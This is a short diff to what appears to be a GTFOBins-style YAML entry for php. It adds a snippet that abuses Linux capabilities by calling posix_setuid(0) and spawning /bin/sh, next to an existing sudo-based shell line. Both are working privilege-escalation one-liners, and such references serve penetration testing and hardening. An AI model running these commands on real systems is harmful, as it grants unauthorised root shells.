@@ -46,4 +46,8 @@ functions:
     - code: |
         CMD="/bin/sh"
         sudo php -r "system('$CMD');"
+  capabilities-enabled:
+    - code: |
+        CMD="/bin/sh"
+        ./php -r "posix_setuid(0); system('$CMD');"
 ---
